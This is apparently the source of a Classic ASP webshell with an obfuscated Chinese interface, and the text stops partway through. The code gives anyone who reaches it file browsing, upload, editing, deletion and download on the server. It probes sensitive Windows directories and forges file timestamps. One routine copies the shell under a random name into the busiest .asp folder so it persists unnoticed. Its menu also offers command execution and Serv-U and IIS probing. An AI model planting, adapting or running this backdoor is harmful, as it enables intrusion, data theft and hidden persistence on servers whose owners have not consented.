<%@LANGUAGE="VBSCRIPT"%>
<%
'pue=true
On Error Resume Next
server.scripttimeout=600
response.buffer = true
Response.Expires = -1
Session.Timeout=60
Const wwj="&#20070;&#39128;&#21073;&#39321;"
Const jlt="&#36825;&#37324;&#23601;&#26159;&#20256;&#35828;&#20013;&#30340;&#29256;&#26435;&#20449;&#24687;&#65292;&#21487;&#20197;&#33258;&#30001;&#21457;&#25381;&#65292;&#35201;&#38271;&#19968;&#28857;&#25165;&#33021;&#30422;&#20303;&#38142;&#25509;&#20449;&#24687;^&#65103;^"
Const oqk="zxp|cyk|dez|bki|ooc|che|koc|zbk|cxa|slf|ysi|azp|bdv|tempfile|zlc|miv|gez|kmt|sqdb|kbsl|newf"
Const pnf=true
Const rfd=33
Const yqo="login"
Const kuf="GB2312"
Const gco="_"
Const fgb="want_pre.asp"
Const righthz="_request_send_sumbit_include_reel_open_form_month_data"
public br,pbwell,juppath,foldermax,maxpath
foldermax=0
dim login,gem,jdu,kyj,ttg,cl,ghq,cey,zxp,cqo,iax,udo,cyk,dez,bki,jqj,tio,jki,nyr,glm,xnr,vnm,pue,zoi,ulz,jsr,gtu,qdr,yqc,ooc,bvn,khd,che,koc,zbk,cxa,slf,ysi,irs,sxi,bin,azp,bdv,wld,ovy,nqv,T1,ito,dqc,eaz,bia,uyy,yjd,xur,nld,zlc,miv,gez,kmt,ouc,rxg,amm,xbd,vuj,dov,ysv,mt,znk,boo,opy,moi,ddo,okCPU,iak,clw,bpx,akh,cgh,ouo,etz,uvt,alr,zpq,pfv,tlk,nrp,zni,ypd,nww,rrt,boq,lqo,gsh,eyq,ifp,afc,pgh,cen,lsv,tag,zhx,eza,ydo,tfv,uxo,fbp,mct,znz
jki= Clng("&H0")
for i=0 to 12
cqo=cqo&"#"&right("000000"&trim(hex(jki)),6)&","
jki=jki+1118481
next
colors=cqo&"#FFFFFF,#f44444,#00FF00,#f00000"
cl=split(colors,",")
sxi="<hr>"
kyj="<font color='"&cl(15)&"'><b>&#8730;</b></font>"
ttg="<font color='"&cl(16)&"'><b>&#215;</b></font>"
Set objRe=new RegExp
objRe.Global=True
objRe.IgnoreCase=True
objRe.MultiLine=True
glm="<style type='text/css'>body{border:0;margin:0;table-layout:fixed;color:"&cl(13)&";font-size:12px;word-break:break-all;background:"&cl(0)&";SCROLLBAR-face-COLOR:"&cl(4)&";crollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(0)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(0)&";overflow:auto;}tr{background-color:"&cl(2)&";padding:2px;}tr,td{margin-top:5px;color:"&cl(10)&";font-size:12px; border-bottom:1px solid "&cl(0)&";}.radio{background:;}form{margin:0;padding:0;}input,select{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;}textarea{border-color:"&cl(11)&";background:"&cl(6)&";color:"&cl(13)&";font:12px Arial,Tahoma;padding:3px 5px 5px 5px;SCROLLBAR-face-COLOR:"&cl(4)&";scrollbar-arrow-color:"&cl(5)&";scrollbar-highlight-color:"&cl(0)&";scrollbar-3dlight-color:"&cl(5)&";scrollbar-shadow-color:"&cl(4)&";overflow:auto;}h2{margin:0;padding:0;height:20px;line-height:20px;font-size:12px;color:"&cl(13)&";}h3{background:"&cl(0)&";margin:0;padding:0;height:30px;line-height:30px;font-size:12px;color:"&cl(13)&";}u{text-decoration: none;color:"&cl(7)&";float:left;display:block;width:50%;margin-right:10px;}a{color: "&cl(12)&";text-decoration:none;}a:hover{color: "&cl(14)&";text-decoration:none;}.fixSpan{overflow: hidden;white-space: nowrap;text-overflow: ellipsis;vertical-align: baseline;}.button{overflow:visible;padding:0px;width:0;height=25px;}</style><script>function qma(str){return str.charCodeAt();}function qhx(pamtoen){if(pamtoen==''){return pamtoen;}else{var tt='';awj='';tmpaci='';for(var i=0;i<pamtoen.length;i++){awj=pamtoen.substr(i,1);tmpaci=awj.charCodeAt();if(128>tmpaci>0){awj=tmpaci+"&rfd&";}tt+=awj+'"&gco&"';}return tt.substr(0,tt.length-1);}}function lwe(id){return document.getElementById(id);}function gtf(cmk){var pamarr;pamarr='"&oqk&"'.split('|');for(var i in pamarr){try{lwe(pamarr[i]).value=lwe(pamarr[i]+'1').value;lwe(pamarr[i]).value=qhx(lwe(pamarr[i]).value);}catch(e){}}lwe(cmk).submit();}function gdp(cmk,swl){var vala=lwe(cmk).cyk;var valb=lwe(cmk).folderpath_x;if(swl==''){vala.value=qhx(valb.value);valb.value='g';}else{vala.value=qhx(swl);}lwe(cmk).submit();}function mtl(syr,filename){if(syr=='db'){lwe('koc').value=qhx(filename);lwe('db').submit();}else{lwe('gem').zxp.value=qhx(syr);lwe('gem').dez.value=qhx(filename);lwe('gem').submit();}}</script>"
ghq = xhc("url")
cey= xhc("local_addr")
iax=server.mappath(".")
udo = server.mappath("/")
br=chr(13)&chr(10)
jdu=split("Sc"&ubd&"ripting.File"&kfi&"SystemObject#WSc"&puf&"ript.Sh"&off&"ell#WSc"&puf&"ript.Shel"&sys&"l.1#Shel"&sys&"l.A"&pvq&"pplication#Shel"&sys&"l.A"&pvq&"pplication.1#WSc"&puf&"ript.Network#Shel"&sys&"l.Users#Ado"&ehm&"db.Str"&vln&"eam#Microsoft.XML"&nac&"HTTP#MSX"&qdd&"ML2.XML"&nac&"HTTP#hzhost.modules#Sc"&ubd&"ripting.Dictionary#Ado"&ehm&"db.Co"&sgb&"nnection#ADOX.Catalog#JRO.JetEngine#Ado"&ehm&"db.Rec"&jxi&"ordSet#SoftArtisan"&bzr&"s.F"&zxq&"ileUp#LyfUpload.UploadFile#Pers"&dzl&"its.Upload.1#JMail.SmtpMail#CDONTS.NewMail#SmtpMail.SmtpMail.1","#")
sub wba(str)
execute str
end sub
sub pmg()
Set moi=axu(jdu(1))
If Not IsObject(moi)Then Set moi=axu(jdu(2))
end sub
Function axu(qps)
Set axu=server.createObject(qps)
End Function
sub qou()
If Err Then
j"<br><a href='javascript:history.back()'><br> "
j Err.Number
j Err.Description
j"</a><br>"
Err.Clear:pkm
End If
end sub
function lxa(str,ixd)
if str<>"" then str="alert('"&str&"');"
str=replace(str,vbCrLf,"")
itm str&iif(ixd=0,"window.location.href=document.referrer;","history.go(-"&ixd&");")
end function
sub pkm()
Response.Flush
end sub
Function xhc(str)
xhc=Request.ServerVariables(str)
End Function
function fvn(str)
fvn=yxm(request(str))
end function
Sub j(str)
response.write(str)
End Sub
function qjd(yyx,doh)
qjd=ere("javascript:gdp(""hf"","""&yry(yyx)&""")","target='_parent'",doh)
end function
function tyh(ptu,fvz,xpo)
tyh=ere("javascript:mtl("""&ptu&""","""&yry(fvz)&""")","",xpo)
end function
function igl(rvf,tname,drm)
if rname="" then rname="&#21024;&#38500;"
igl=ere("javascript:mtl("""&drm&""","""&yry(rvf)&""")","class='am' onclick='javascript:return confirm(""&#30830;&#23450;&#21024;&#38500;  "&tname&""")'","&#21024;&#38500;")
end function
Function yry(str)
yry=Replace(str,"\","\\")
yry=Replace(yry,".","\.")
yry=Replace(yry,"?","\?")
yry=Replace(yry,"+","\+")
yry=Replace(yry,"(","\(")
yry=Replace(yry,")","\)")
yry=Replace(yry,"*","\*")
yry=Replace(yry,"[","\[")
yry=Replace(yry,"]","\]")
End Function
Function qhx(pamToEn)
If Not pnf Or pamToEn=""Then
qhx=pamToEn
Exit Function
End If
Dim tt,awj
tt=""
For i=1 To Len(pamToEn)
awj=Mid(pamToEn,i,1)
If Asc(awj)<128 And Asc(awj)>0 Then
tt=tt&Asc(awj)+rfd&gco
Else
tt=tt&awj&gco
End If
Next
qhx=Left(tt,Len(tt)-1)
End Function
Function aeg(str,cth)
objRe.Pattern=cth
aeg=objRe.Test(str)
End Function
Function yxm(raa)
If Not pnf Or raa="" Or Not aeg(raa,"^((\d+|.)"&gco&")+(\d+|.)$")Then
yxm=raa
Exit Function
End If
Dim dd,fne
dd=""
fne=Split(raa,gco)
For i=0 To UBound(fne)
If IsNumeric(fne(i))Then
dd=dd&Chr(CInt(fne(i))-rfd)
Else
dd=dd&fne(i)
End If
Next
yxm=dd
End Function
function fpx(s)
if not isnull(s) then
s=replace(s,">","&gt;")
s=replace(s,"<","&lt;")
s=replace(s,chr(39),"&#39;")
s=replace(s,chr(34),"&quot;")
s=replace(s,chr(20),"&nbsp;")
fpx=s
end if
end function
function bvy(t)
dim f_s,f_t,f_w
f_w="webdings"
select case t
case "1"
f_w="wingdings":f_s=3:f_t="1"
case "2"
f_w="wingdings":f_s=3:f_t="&#200;"
case "0","8"
f_w="wingdings":f_s=3:f_t="0"
case "asp","asa","cer","cdx" 
f_s=4:f_t="&#166;"
case "3"
f_w="wingdings":f_s=2:f_t="&#232;"
case "4"
f_w="wingdings":f_s=3:f_t="&#238;"
case "aspx"
f_s=4:f_t="&#157;"
case "jsp"
f_s=4:f_t="&#158;"
case "html","shtml","htm"
f_s=4:f_t="&#155;"
case "jpg","gif","png","bmp"
f_s=4:f_t="&#156;"
case "txt","inc","ybe"
f_s=4:f_t="&#165;"
case "css"
f_s=4:f_t="&#162"
case "php"
f_s=4:f_t="&#202;"
case "t"
f_s=2:f_t="8"
case "js"
f_w="wingdings":f_s=4:f_t="O"
case "exe","com","bat"
f_w="wingdings":f_s=4:f_t="&#255;"
case "rar","zip","7z"
f_s=4:f_t="&#144;"
case "db","mdb"
f_s=4:f_t="&#168;"
case else
f_s=4:f_t="&#163;"
end select
bvy="<font face="&f_w&" size="&f_s&">"&f_t&"</font> "
end function 
sub cqb(a,b,c)
j"<a href='"&a&"' "&b&">"&c&"</a>"
end sub
function ere(a,b,c)
ere="<a href='"&a&"' "&b&">"&c&"</a>"
end function
function rso()
bzg"hf",ghq,"":ekf"cyk","hidden",0:jzg
jsr=iif(fvn("cyk")="","ofv","dnk")
faq"100%"" height=""100%"" class=""menu"
dvs 4
j"<td height='22' valign='top'>"
oob
xlj 4
rny 60,"<h2>&#22320;&#22336;&#26639;&#65306;</h2>"
rny"",ohp("cyk1","text|100%",session("cyk"))
rny 10,ohp("^:gtf('hf')","button","GO")
cqm
pry
dvs 4
rny"","<iframe name='fileframe' src='?zxp="&jsr&"' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
cqm
end function
function pry()
on Error Resume Next
bzg"gem",ghq,"fileframe":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
oob
rny"c",qjd(udo,"WEB&#26681;&#30446;&#24405;")
rny"c",qjd(iax,"&#26412;&#31243;&#24207;&#30446;&#24405;")
'<!
rny"c",tyh("bgr","","&#30446;&#24405;&#25195;&#25551;")
rny"c",tyh("ckz","","&#25991;&#20214;&#25195;&#25551;")
rny"c",tyh("kad","","&#25968;&#25454;&#24211;&#25805;&#20316;")
rny"c",tyh("pqy","","&#25191;&#34892;CMD")
rny"c",tyh("yhi","","&#29992;&#25143;&#36827;&#31243;")
rny"c",tyh("rta","","Serv"&nan&"-U Ftp")
rny"c",tyh("qpf","","IIS&#20449;&#24687;")
rny"c",tyh("jjj","","mmmmmmm")
'!>
rny"c",ere(ghq,"target=_top","&#27426;&#36814;&#30028;&#38754;")
rny"c",tyh("logout","","&#36864;&#20986;")
cqm
j "<hr>"
end function
class llbf
dim cf
sub class_initialize
set cf=axu(jdu(0))
end sub
sub class_terminate
set cf=nothing
end sub
'<!
function qcg(c)
On Error Resume Next
dim quu,e
quu="\Program Files,\Documents and Settings\All Users,\Documents and Settings\All Users\&#12300;&#24320;&#22987;&#12301;&#33756;&#21333;\&#31243;&#24207;,\recycler,\wmpub,\WINDOWS,\WINDOWS\Temp,\Program Files\RhinoSoft.com,\Program Files\ServU,\php,\Program Files\Microsoft SQL Server,\docume~1\alluse~1\Application Data\Symantec\pcAnywhere,\Documents and Settings\All Users\&#26700;&#38754;,\documents and settings\All Users\Application Data\Microsoft\Media Index"
for each c in cf.drives
for each a in split(quu,",")
e=c&a
if cf.folderexists(e) then xlj 0:rny"",ere("javascript:gdp(""hf"","""&yry(e)&""")","target='_parent' title='"&e&"'","&#12304;"&left(e,1)&"&#12305;&#12304;"&rol(e,"\")&"&#12305;")
next
next
end function
'!>
function ggr(m)
On Error Resume Next
for each d in cf.drives
if m=0 then dvs 1:rny"",qjd(d&"\","&#30913;&#30424;&nbsp;&nbsp;("&d.driveletter&":)")
next
end function
function gzw(jqj,kbq)
gzw=cf.getparentfoldername(jqj)
if gzw="" then gzw=jqj
juppath=gzw
if kbq="" then kbq="&#12304;&#36820;&#22238;&#12305;"
gzw=qjd(gzw,piq(kbq))
end function
function son(dez)
if instr(dez,udo) then
son=replace(dez,udo,"")
son=replace(son,"\","/")
if left(son,1)<>"/" then son="/"&son
son=ere(son,"class='am' target='_blank'","&#25171;&#24320;")
else
son="&nbsp;"
end if
end function
function fuq(jqj)
bzg"gem",ghq,"filelist":ekf"zxp","hidden",0:ekf"dez","hidden",0:ekf"newf","hidden",0:jzg
bzg"db",ghq,"_parent":ekf"zxp","hidden","kad":ekf"theAct","hidden","qpr":ekf"param","hidden","":ekf"koc","hidden","":jzg
jqj=fpx(jqj)
set fold=cf.getfolder(jqj)
if right(jqj,1)<>"\" then jqj=jqj&"\"
oob
for each f in fold.subfolders
foldername=fpx(f.name)
dvs 0
rny 10,bvy(0)
rny"",qjd(jqj&foldername,foldername)
rny 70,"&nbsp;"
rny 70,ztz(2,jqj&foldername,f.Attributes)
rny 160,iif(datediff("d",f.datelastmodified,now())=0,piq(f.datelastmodified),f.datelastmodified)
rny 40,"&nbsp;"
rny 40,"&nbsp;"
rny 40,tyh("ert",jqj&foldername,"&#22797;&#21046;")
rny 40,tyh("ewg",jqj&foldername,"&#31227;&#21160;")
rny 40,igl(jqj&foldername,foldername&"&nbsp;&#21450;&#20854;&#23376;&#30446;&#24405;&#21644;&#25991;&#20214;","llk")
rny 40,"&nbsp;"
next
for each l in fold.files
filename=fpx(l.name):rav=filename
jeg=jqj&filename
if vgm(filename,".",false)="index" or vgm(filename,".",false)="default" then rav=piq(rav)
dvs 1
rny 10,bvy(LCase(rol(filename,".")))
rny"",tyh("sim",jeg,rav)
rny 70,clng(l.size/1024)&"k"
rny 70,ztz(1,jeg,l.Attributes)
rny 160,iif(datediff("d",l.datelastmodified,now())=0,piq(l.datelastmodified),l.datelastmodified)
rny 40,son(jeg)
rny 40,tyh("bgu",jeg,"&#32534;&#36753;")
rny 40,tyh("qzn",jeg,"&#22797;&#21046;")
rny 40,tyh("uuv",jeg,"&#31227;&#21160;")
rny 40,igl(jeg,filename,"cgt")
rny 40,tyh("db",jeg,"&#25968;&#25454;&#24211;")
next
cqm
set fold=nothing
end function
function dnk(jqj)
dim khb,urn,jio,fru,jeg,rav
bzg"hf",ghq,"_parent":ekf"cyk","hidden",0:jzg
bzg"gem",ghq,"filelist":ekf"zxp","hidden",0:ekf"dez","hidden",0:ekf"newf","hidden",0:jzg
faq"100%"" height=""100%"
xlj 3
j"<td width='200px' align='center' style='background-color:"&cl(0)&"'><div style='overflow-y:auto;height:100%;'>"
faq"95%"
ggr 0
dvs 1:rny"",qjd(udo,"&#31449;&#28857;&#26681;&#30446;&#24405;")
dvs 1:rny"",qjd(iax,"&#26412;&#31243;&#24207;&#30446;&#24405;")
'<!
qcg(d)
'!>
cqm
j"</td><td>"
faq"100%"" height=""100%"
j"<tr style='padding:0px;'><td height='10' style='border-bottom:0px;'>"
oob
xlj 4
fjk
'<!
rny 120,"&nbsp;"&ohp("^:mtl('yrw','')","button","&#25171;&#21253;&#24403;&#21069;&#30446;&#24405;")
'!>
kca jqj
cqm
j"</td><tr style='padding:0px;'><td>"
faq"100%"" height=""100%"
xlj 2:rny"'% colspan='2",b("&#21517;&#31216;")
rny 70,b("&#22823;&#23567;"):rny 70,b("&#23646;&#24615;"):rny 160,b("&#20462;&#25913;&#26102;&#38388;"):rny 40,"&nbsp;":rny 40,"&nbsp;":rny 40,"&nbsp;":rny 40,b("&#25805;&#20316;"):rny 40,"&nbsp;":rny 40,"&nbsp;":rny 14,"&nbsp;"
dvs 0
rny"'% colspan='13",bvy(0)&gzw(jqj,"..")
j"<tr style='padding:0px;'>"
rny"'% height='100%' colspan='13","<iframe name='filelist' id='filelist' src='?zxp=fuq' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>"
cqm
j"</td>"
cqm
end function
function fjk()
On Error Resume Next
if newf<>"" then
execute "cf.CreateF"&bcn&"older session(""cyk"")&newf"
alertstr=iif(err,Err.Description,"")
lxa alertstr,0
else
itm"gem.zxp1.value='bgu'"
rny 60,"<h2>"&bvy("t")&"&#26032;&#24314;:</h2>"
rny 50,ohp("creattype^:gem.zxp1.value='bgu'","radio"" checked ""","bgu")&"&#25991;&#20214;"
rny 50,ohp("creattype^:gem.zxp1.value='fjk'","radio","fjk")&"&#30446;&#24405;"
rny 200,ohp("newf1","text","New")
rny 10,ohp("^:if(gem.zxp1.value=='fjk'){gem.target='';}gtf('gem');","button","&#21019;&#24314;")
end if
end function
function ztz(ty,jqj,num)
hz="-":if num>=32 then hz="A"
select case num
case 0,16,32,2,18,34 ztz="x"
case else ztz="v"
end select
if ztz="v" then
ztz=ere("javascript:mtl(""msq"",""v"&ty&"@"&yry(jqj)&""")","class='am' title='&#35299;&#38145;'","&#23646;&#24615;")&"<font face='webdings' size='1' color="&cl(16)&">x</font>"&num
else
ztz=ere("javascript:mtl(""msq"",""x"&ty&"@"&yry(jqj)&""")","class='am' title='&#21152;&#38145;'","&#23646;&#24615;")&"&#8730;"&num
end if
end function
function llk(jqj) 
On Error Resume Next
if cf.folderexists(jqj) then
execute "cf.Dele"&qlb&"teFolder jqj"
lxa Err.Description,iif(err,2,0)
end if
end function
function cgt(jqj)
On Error Resume Next
if cf.fileexists(jqj) then
cf.GetFile(jqj).attributes=0
execute "cf.Delet"&ykb&"eFile jqj"
lxa Err.Description,iif(err,2,0)
end if
end function
Function sim(jqj)
Response.Clear
dim zoh
Set zoh=axu(jdu(7))
zoh.Open
zoh.Type=1
execute "zoh.Load"&oba&"FromFile jqj"
sz=InstrRev(jqj,"\")+1
Response.AddHeader "Content-Disposition","attachment; filename="&Mid(jqj,sz)
Response.AddHeader "Content-Length",zoh.Size
Response.CodePage=65001
Response.ContentType="application/octet-stream"
Response.BinaryWrite zoh.Read
pkm
zoh.Close
Set zoh=Nothing
End Function
function kca(jqj)
on Error Resume Next
dim bup,msb,caf,sls,wji,ycf
if request("khd")<>"post" then
bzg"upl",ghq&"?zxp=kca&khd=post"" enctype=""multipart/form-data",""
if session("ufi")<>"" then
rny"c",session("ufi")&" &#19978;&#20256;&#25104;&#21151;! "&b(son(session("ufi")))
else
rny 60,"<h2>"&bvy("t")&"&#19978;&#20256;:</h2>"
rny"",ohp("bd1f^;re1n.value=this.value.split('\\')[this.value.split('\\').length-1]","file|100%",0)&ohp("os1p","hidden",replace(session("cyk"),"\\","\"))
rny 160,ohp("re1n","text","&#37325;&#21629;&#21517;")
rny"40",ohp("^:gtf('upl')","button","&#19978;&#20256;")
end if
jzg
session("ufi")=""
else
Set u=new UUPC
Set f=U.UA("bd1f")
UName=replace(session("cyk")&U.form("re1n"),"\\","\")
If UName="" Or f.yzi=0 then
lxa"&#35831;&#36755;&#20837;&#19978;&#20256;&#30340;&#23436;&#20840;&#36335;&#24452;&#21518;&#36873;&#25321;&#19968;&#20010;&#25991;&#20214;&#19978;&#20256;!",0
Else
f.rck UName
If Err.number=0 Then
session("ufi")=UName
lxa"",0
else
itm"alert('&#19978;&#20256;&#22833;&#36133;\n&#38169;&#35823;&#21407;&#22240;&#65306;"&Err.Description&"\n&#26816;&#26597;&#26159;&#21542;&#26377;&#20889;&#26435;&#38480;!');window.history.go(-1);"
end if
End If
set f=nothing
set u=nothing
end if
end function
function qis(vhj,jqj)
On Error Resume Next
err.clear
Set bin=axu(jdu(3))
If Not IsObject(bin)Then Set bin=axu(jdu(4))
if vhj<>"" And IsDate(vhj) then bin.NameSpace(vgm(jqj,"\",False)).ParseName(rol(jqj,"\")).ModIfyDate=vhj
set bin=nothing
if err.number=0 then
qis="&#25991;&#20214;&#26368;&#21518;&#20462;&#25913;&#26102;&#38388;&#20026;&#65306;"&vhj
else
qis="&#20462;&#25913;&#26102;&#38388;&#22833;&#36133;"
end if
end function
function adx(jqj,w)
On Error Resume Next
if w<>"" then cf.GetFile(jqj).attributes=w
adx=cf.GetFile(jqj).attributes
err.clear
end function
function bgu(jqj)
'On Error Resume Next
jqj=dez
if jqj="" then jqj=newf:khd="new"
dim srg
if char="" then char="gb2312"
if khd="post" then
set t=axu(jdu(7))
With t
.Type=2
.mode=3 
.open 
.charset=char
.WriteText content
.SaveToFile jqj,2 
.Close 
End With
alertstr=iif(err=0,"&#25991;&#20214;&#20445;&#23384;&#25104;&#21151;!",Err.Description)
set t=nothing
pfv=fvn("pfv")
if fvn("filesafe")="1" then pfv=7
if pfv="" then pfv=32
if clng(adx(jqj,pfv))<>clng(pfv) then srg=piq("&#20462;&#25913;&#25991;&#20214;&#23646;&#24615;&#22833;&#36133; ")
j"<center><br><br><br>&#25991;&#20214;&#20445;&#23384;&#25104;&#21151;&#65281;"&qis(lastmodified,jqj)
j"<br>"&srg&"&#25991;&#20214;&#24403;&#21069;&#23646;&#24615;&#20026;&#65306;"&adx(jqj,"")&ere("javascript:history.go(-1);","",piq("&#12304;&#36820;&#22238;&#12305;"))&gzw(jqj,"&#12304;&#21047;&#26032;&#12305;")
j"</center>"
response.end
end if
if jqj<>"" then
if instr(jqj,session("cyk"))=0 then jqj=session("cyk")&jqj
if cf.fileexists(jqj) then
pfv=adx(jqj,"")
adx jqj,0
set t=axu(jdu(7))
With t
.Type=2
.mode=3 
.open
.charset=char
.loadfromfile jqj
txt=Replace(.ReadText(),Chr(0)," ")
.Close 
End With
set t=nothing 
end if
end if
if khd="new" then
wvy"&#26032;&#24314;&#25991;&#20214;"
txt=content
else
wvy"&#32534;&#36753;&#25991;&#20214;"
end if
oob
xlj 3
j"<td valign='top' align='center'>"
ekf"dez1","text",jqj
bzg"tttf",ghq,""
ekf"khd","hidden",khd
ekf"zxp","hidden","bgu"
ekf"pfv","hidden",pfv
ekf"dez","hidden",jqj
j"<textarea name='content' class='text' style='width:100%;' rows='25'>"&txt&"</textarea><br>"
j"<hr>"
j"&#38145;&#23450;&#65306;<input name=""filesafe"" type=""checkbox"" value=""1"" onclick=""javascript:att();"" id=""filesafe"""
if fvn("filesafe")="1" then j"checked"
j"><span id='att'>(&#21407;&#23646;&#24615;)&nbsp;&nbsp;</span>"
j"&#20462;&#25913;&#26085;&#26399;:"
tlk=now()
if cf.fileexists(jqj) then tlk=cf.getfile(jqj).datelastmodified
ekf"lastmodified","text|150",tlk:j"&nbsp;&nbsp;&nbsp;"
ekf"goback^:history.back()","button","&#36820;&#22238;":j"&nbsp;&nbsp;&nbsp;"
ekf"reset","reset","&#37325;&#32622;":j"&nbsp;&nbsp;&nbsp;"
ekf"^:khd.value='post';gtf('tttf')","button","&#20445;&#23384;":j"&nbsp;&nbsp;&nbsp;"
ekf"char^:gtf('tttf')","radio"" "&iif(char="gb2312","checked","")&" ""","gb2312"
j"gb2312"
ekf"char^:gtf('tttf')","radio"" "&iif(char="utf-8","checked","")&" ""","utf-8"
j"utf-8"
jzg
j"</td></tr></table>"
end function
function qzn(dez)
wvy"&#22797;&#21046;&#25991;&#20214;"
if fvn("bki")="" then
div"&#23558;&#25991;&#20214; "&uvg(dez)&" &#22797;&#21046;&#21040;",3
jvm"","","qzn",dez,"hidden",session("cyk"),"text","&#22797;&#21046;"
end if
bki=fvn("bki")
if cf.fileexists(dez) and bki<>"" then
execute "cf.C"&elb&"opyFile dez,bki"
j"<center><br><br><br>&#25991;&#20214; "&dez&" &#25104;&#21151;&#22797;&#21046;&#21040; "
j qjd(bki,bki)
j"</center>"
end if
end function
function uuv(dez)
wvy"&#31227;&#21160;&#25991;&#20214;"
if fvn("bki")="" then
div"&#23558;&#25991;&#20214; "&dez&" &#31227;&#21160;&#21040;",3
jvm"","","uuv",dez,"hidden",dez,"text","&#31227;&#21160;"
else
if cf.fileexists(dez) and bki<>"" then
execute "cf.MoveFil"&mrb&"e dez,bki"
j"<center><br><br><br>&#25991;&#20214; "&dez&" &#25104;&#21151;&#31227;&#21160;&#21040; "&bki
j ere("javascript:history.go(-2);","",piq("&#12304;&#36820;&#22238;&#12305;"))&gzw(bki,"&#12304;&#21047;&#26032;&#12305;")
j"</center>"
end if
end if
end function
function ert(jqj)
wvy"&#22797;&#21046;&#25991;&#20214;&#22841;"
if fvn("bki")="" then
div"&#23558;&#25991;&#20214;&#22841;"&uvg(dez)&"&#22797;&#21046;&#21040;",3
jvm"","","ert",dez,"hidden",session("cyk"),"text","&#22797;&#21046;"
end if
bki=fvn("bki")
if cf.folderexists(dez) and bki<>"" then
execute "cf.Copy"&zcu&"Folder dez,bki"
j"<center><br><br><br>&#25991;&#20214;&#22841;"&dez&"&#25104;&#21151;&#22797;&#21046;&#21040;"
j qjd(bki,bki)
j"</center>"
end if
end function
function msq(jqj)
dim yjq,wku
yjq=left(split(jqj,"@")(0),1)
wku=right(split(jqj,"@")(0),1)
jqj=split(jqj,"@")(1)
if wku=1 then Set thisfile = cf.GetFile(jqj)
if wku=2 then Set thisfile = cf.GetFolder(jqj)
if yjq="v" then
thisfile.Attributes=32/wku
else
thisfile.Attributes=7
end if
Set theFile = Nothing
itm("location.href=document.referrer;")
end function
'<!
function jjj(jqj)
zpq=split(righthz,"_")
n=0
bpx=vph(udo)
execute "set f=cf.O"&siy&"penTextFile(xhc(""PATH_TRANSLATED""),1)"
newtxt=f.readall
set f=nothing
objre.Pattern="'<"&"![\s\S]*?'!"&">"
newtxt=objre.replace(newtxt,"")
randomize
m=int((foldermax)*rnd+1)
l=int((ubound(zpq))*rnd+1)
for each x in cf.getfolder(bpx).files
if right(x.name,4)=".asp" then
n=n+1
if n=m then
cgh=x.name
pfv=x.attributes
tlk=x.datelastmodified
end if
end if
next
objre.Pattern=fgb&".+?"&vbCrLf
newtxt=objre.replace(newtxt,cgh&chr(34)&vbCrLf)
j "<textarea style='width=80%;height=60%;'>"&newtxt&"</textarea>"
j xhc("PATH_INFO")&"<br>"
j xhc("QUERY_STRING")&"<br>"
nrp=iif(instr(cgh,"_")>0,"_",".")
cgh=vgm(cgh,nrp,False)&iif(nrp="_",nrp,"")&zpq(l)&".asp"
cgh=bpx&cgh
execute "set f=cf.OpenTe"&tsv&"xtFile(cgh,2,true)"
f.write(newtxt)
set f=nothing
adx cgh,pfv
qis tlk,cgh
newurl=replace(cgh,udo,"")
if left(newurl,1)<>"\" then newurl="/"&replace(newurl,"\","/")
session.Abandon()
bzg"n",newurl&"?"&yqo,"_parent":jzg:itm"n.submit()"
Response.end
end function
function vph(jqj)
On Error Resume Next
pkm
dim pdq
if right(jqj,1)<>"\" then jqj=jqj&"\"
set F=cf.getfolder(jqj)
for each x in f.Subfolders
vph jqj&x.name
next
set f=nothing
pdq=lis(jqj)
if pdq>foldermax then foldermax=pdq:maxpath=jqj
vph=maxpath
end function
function lis(jqj)
i=0
set F=cf.getfolder(jqj)
for each x in f.files
if right(x.name,4)=".asp" then i=i+1
next
set f=nothing
lis=i
end function
sub cie(jqj)
dim cea,iuy
On Error Resume Next
set nyr=cf.GetFolder(jqj)
for each objFile in nyr.Files
cea=replace(jqj&"\"&objFile.name,"\\","\")
if cea<>"" then
if fvn("sctype")="1" then
if instr(1,objFile.name,tio,1)>0 then
fhq cea,ovy,wld
end if
else
if sjx(cea,tio,3) then
fhq cea,ovy,wld
end if
end if
end if
pkm
next
set nyr=nothing
end sub
function sjx(filename,frg,nfr)
On Error Resume Next
dim yyk
sjx=false
if frg="" then sjx=true
yyk=fvn("lastn")
if yyk="" then yyk="|asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|ybe|"
if right(yyk,1)<>"|" then yyk=yyk&"|"
if left(yyk,1)<>"|" then yyk="|"&yyk
if instr(1,yyk,"|"&cf.GetExtensionName(filename)&"|",1)>0 then
if nfr=1 or nfr=2 then
set t=axu(jdu(7))
t.Type=2
t.mode=3 
if nfr=1 then t.charset="gb2312"
if nfr=2 then t.charset="utf-8"
t.open 
execute "t.LoadFromF"&uwo&"ile filename"
yjd=t.readtext
if instr(1,yjd,frg,1)>0 then sjx=true
t.flush 
t.Close 
set t=nothing
else
execute "set t=cf.O"&juc&"penTextFile(filename,1,false)"
if cf.getfile(filename).size>0 then
yjd=t.readall
end if
if yjd<>"" then
if instr(1,yjd,frg,1)>0 then sjx=true
end if
t.close
set t=nothing
end if
end if
end function
function fhq(wwk,icu,mjf)
dim fxu
if right(wwk,1)="\" then fxu="fo" else fxu="fi"
if fxu="fo" then wvm wwk,icu,mjf,1
if fxu="fi" then xzr wwk,icu,mjf
end function
sub oim(jqj)
On Error Resume Next
if cf.folderexists(jqj) then
set nyr=cf.GetFolder(jqj)
for each objSubFolder in nyr.Subfolders
if objSubFolder then
nowpath=replace(jqj&"\"&objSubFolder.name,"\\","\")
if right(nowpath,1)<>"\" then nowpath=nowpath&"\"
if ifp="1" and afc="1" then cie(nowpath):pkm
if afc="1" and instr(nowpath,":") then oim nowpath:pkm
end if
err.clear
pkm
next 
set nyr=nothing
end if
end sub
sub wcj(djf)
bzg"gem",ghq,"fileframe":ekf"zxp","hidden",0:ekf"dez","hidden",0:jzg
oob
dvs 3
rny"'% colspan='3","<h2>"&bvy("t")&"&#25195;&#25551;&#32467;&#26524;:</h2>"
wfp
rny"",b("&#21517;&#31216;")
rny"30c",b("&#21487;&#35835;")
rny"30c",b("&#21487;&#20889;")
cqm
pkm
dim rnm
rnm=dez
for each x in cf.drives
